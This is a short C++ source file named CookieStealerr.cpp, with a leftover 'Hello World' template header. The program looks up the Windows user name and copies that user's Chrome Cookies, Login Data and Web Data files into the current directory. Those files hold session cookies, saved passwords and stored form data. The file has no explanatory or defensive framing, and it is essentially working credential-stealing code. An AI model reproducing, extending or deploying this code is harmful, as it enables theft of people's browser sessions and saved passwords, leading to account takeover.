//============================================================================
// Name        : CookieStealerr.cpp
// Author      : 
// Version     :
// Copyright   : Your copyright notice
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Lmcons.h>
using namespace std;

#define INFO_BUFFER_SIZE 32767
TCHAR  infoBuf[INFO_BUFFER_SIZE];
DWORD  bufCharCount = INFO_BUFFER_SIZE;

int main() {
	 FILE *fp1, *fp2,*fp3, *fp4, *fp5, *fp6;
	 register int key,key2,key3;

	  const unsigned long maxDir = 260;
	      char currentDir[maxDir];
	      GetCurrentDirectory(maxDir, currentDir);

	  char user_name[UNLEN+1];
	  DWORD user_name_size = sizeof(user_name);
	  GetUserName(user_name, &user_name_size);


	  string s,s2,s3;
	  s += string("C:\\Users\\") + user_name + string("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");
	  s2 += string("C:\\Users\\") + user_name + string("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
	  s3 += string("C:\\Users\\") + user_name + string("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data");

	  string c,c2,c3;
	  c += currentDir + string("\\cookies");
	  c2 += currentDir + string("\\Login");
	  c3 += currentDir + string("\\WebData");


	  fp1 = fopen(s.c_str(),"rb");
	  fp2 = fopen(c.c_str(), "wb");
	  fp3 = fopen(s2.c_str(),"rb");
	  fp4 = fopen(c2.c_str(), "wb");
	  fp5 = fopen(s3.c_str(),"rb");
	  fp6 = fopen(c3.c_str(), "wb");

	  while ((key = fgetc(fp1)) != EOF)
	  	 {
	  	 	fputc(key, fp2);
	  	 }

	  while ((key2 = fgetc(fp3)) != EOF)
	  	 {
	  	  	fputc(key2, fp4);
	  	 }

	  while ((key3 = fgetc(fp5)) != EOF)
	  	 {
		  	fputc(key3, fp6);
	  	 }


	  fclose(fp1);
	  fclose(fp2);
	  fclose(fp3);
	  fclose(fp4);
	  fclose(fp5);
	  fclose(fp6);

	  return 0;
}
